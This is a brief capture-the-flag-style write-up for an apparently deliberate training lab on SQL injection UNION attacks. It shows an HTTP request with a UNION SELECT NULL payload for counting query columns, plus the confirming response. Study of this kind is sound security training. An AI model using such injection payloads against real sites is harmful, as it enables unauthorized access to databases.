# SQL injection UNION attack, determining the number of columns returned by the query

### Adding NULL unless and until I get a 200 status code .
**Request**
```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
Host: 0a1300d8041a834481f02f280021009e.web-security-academy.net
Cookie: session=MmaS8aSJkGRVIiXuBUTXXS5VnCJAdudZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1300d8041a834481f02f280021009e.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5174

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, determining the number of columns returned by the query</title>
    </head>
    [...remaining are omitted...]
```
